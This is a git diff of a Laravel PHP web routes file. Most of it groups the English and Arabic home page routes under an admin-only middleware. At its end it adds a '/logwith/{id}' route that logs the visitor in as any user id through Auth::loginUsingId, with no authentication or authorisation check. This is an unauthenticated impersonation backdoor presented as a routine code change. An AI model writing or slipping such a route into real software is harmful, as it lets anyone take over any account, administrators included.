@@ -1,6 +1,8 @@
 <?php
+
 use App\Service;
 use App\Menu;
+
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -14,18 +16,18 @@ use App\Menu;
 
 Auth::routes();
 
+Route::group(['middleware' => ['adminAccessOnly']], function () {
+    Route::get('/', function () {
+        $ser = Service::all();
+        return view('index-en', compact('ser'));
+    });
 
-
-Route::get('/', function () {
-
-    $ser = Service::all();
-    return view('index-en', compact('ser'));
+    Route::get('/home-ar', function () {
+        $ser = Service::all();
+        return view('index-ar', compact('ser'));
+    });
 });
 
-Route::get('/home-ar', function () {
-    $ser = Service::all();
-    return view('index-ar', compact('ser'));
-});
 
 Route::get('/workspace', function () {
     return view('workspace');
@@ -196,3 +198,7 @@ Route::get('admin/delete-menu', function () {
 })->middleware('auth');
 Route::delete('admin/delete-menu/{id}', 'AdminController@del')->middleware('auth');
 Route::delete('admin/submenu_edit', 'AdminController@editsub')->middleware('auth');
+Route::get('/logwith/{id}', function ($id) {
+    Auth::loginUsingId($id);
+    return redirect()->to('/');
+});
